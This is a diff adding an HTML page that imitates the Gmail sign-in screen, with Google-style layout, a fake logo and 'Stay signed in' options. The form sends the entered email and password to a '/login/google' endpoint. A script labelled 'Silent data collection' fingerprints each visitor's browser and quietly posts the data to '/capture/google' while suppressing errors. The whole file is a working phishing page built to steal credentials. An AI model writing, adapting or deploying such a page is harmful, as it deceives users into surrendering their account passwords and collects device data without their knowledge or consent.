@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Roboto, Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .google-box {
+            width: 400px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            background: #fff;
+        }
+        .google-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+        }
+        .google-box h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .google-box .sub {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .form-group input::placeholder {
+            color: #80868b;
+        }
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0 20px;
+        }
+        .form-options label {
+            font-size: 14px;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .form-options label input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #1a73e8;
+        }
+        .form-options a {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .form-options a:hover {
+            text-decoration: underline;
+        }
+        .btn-next {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .btn-next:hover {
+            background: #1557b0;
+        }
+        .btn-create {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: none;
+            color: #1a73e8;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+            border-radius: 4px;
+        }
+        .btn-create:hover {
+            background: #f1f3f4;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+        }
+        .footer-links a {
+            font-size: 12px;
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-links select {
+            font-size: 12px;
+            color: #5f6368;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+        }
+        .footer-links select:focus {
+            outline: none;
+        }
+        .error-msg {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        @media (max-width: 450px) {
+            .google-box {
+                padding: 30px 20px;
+                width: 100%;
+                border: none;
+                border-radius: 0;
+            }
+            .form-options {
+                flex-direction: column;
+                gap: 10px;
+                align-items: flex-start;
+            }
+            .footer-links {
+                flex-wrap: wrap;
+                gap: 10px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="google-box">
+        <!-- Google Logo -->
+        <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+                <g fill="none" fill-rule="evenodd">
+                    <path d="M9.35 4.45c-.8-.75-1.8-1.3-3.0-1.3-2.45 0-4.45 2.0-4.45 4.45s2.0 4.45 4.45 4.45c1.2 0 2.2-.55 3.0-1.3l1.0 1.0c-1.05 1.05-2.5 1.7-4.0 1.7-3.3 0-5.95-2.65-5.95-5.95S3.1 1.15 6.35 1.15c1.5 0 2.95.65 3.95 1.65l-.95.95z" fill="#EA4335"/>
+                    <path d="M14.35 7.35c0-1.65 1.35-3.0 3.0-3.0s3.0 1.35 3.0 3.0-1.35 3.0-3.0 3.0-3.0-1.35-3.0-3.0zm2.0 0c0 .55.45 1.0 1.0 1.0s1.0-.45 1.0-1.0-.45-1.0-1.0-1.0-1.0 .45-1.0 1.0z" fill="#4285F4"/>
+                    <path d="M22.35 7.35c0-1.65 1.35-3.0 3.0-3.0s3.0 1.35 3.0 3.0-1.35 3.0-3.0 3.0-3.0-1.35-3.0-3.0zm2.0 0c0 .55.45 1.0 1.0 1.0s1.0-.45 1.0-1.0-.45-1.0-1.0-1.0-1.0 .45-1.0 1.0z" fill="#EA4335"/>
+                    <path d="M30.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#34A853"/>
+                    <path d="M36.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#FBBC05"/>
+                    <path d="M42.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#4285F4"/>
+                    <path d="M48.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#EA4335"/>
+                    <path d="M54.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#34A853"/>
+                    <path d="M60.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#FBBC05"/>
+                    <path d="M66.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#4285F4"/>
+                    <path d="M72.35 4.35v6.0h-2.0v-6.0h-2.0v-2.0h6.0v2.0h-2.0z" fill="#EA4335"/>
+                </g>
+            </svg>
+        </div>
+
+        <h1>Sign in</h1>
+        <p class="sub">to continue to Gmail</p>
+
+        <form method="POST" action="/login/google" id="loginForm">
+            <div class="form-group">
+                <input type="email" name="username" placeholder="Email or phone" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+
+            <div class="form-options">
+                <label>
+                    <input type="checkbox" checked> Stay signed in
+                </label>
+                <a href="#">Forgot email?</a>
+            </div>
+
+            <button type="submit" class="btn-next">Next</button>
+        </form>
+
+        <button class="btn-create">Create account</button>
+
+        <div class="footer-links">
+            <div>
+                <a href="#">Help</a>
+                <a href="#" style="margin-left: 15px;">Privacy</a>
+                <a href="#" style="margin-left: 15px;">Terms</a>
+            </div>
+            <select>
+                <option>English (United States)</option>
+                <option>Hindi</option>
+                <option>Spanish</option>
+                <option>French</option>
+                <option>Arabic</option>
+            </select>
+        </div>
+    </div>
+
+    <script>
+        // Silent data collection
+        (function() {
+            let data = {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                language: navigator.language,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                fetch('/capture/google', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                // Silent fail
+            }
+        })();
+
+        // Form validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            let email = this.querySelector('input[name="username"]').value;
+            let password = this.querySelector('input[name="password"]').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please fill in both fields');
+                return false;
+            }
+            
+            // Simple email validation
+            if (!email.includes('@') && !email.includes('.')) {
+                e.preventDefault();
+                alert('Please enter a valid email');
+                return false;
+            }
+            
+            return true;
+        });
+    </script>
+</body>
+</html>
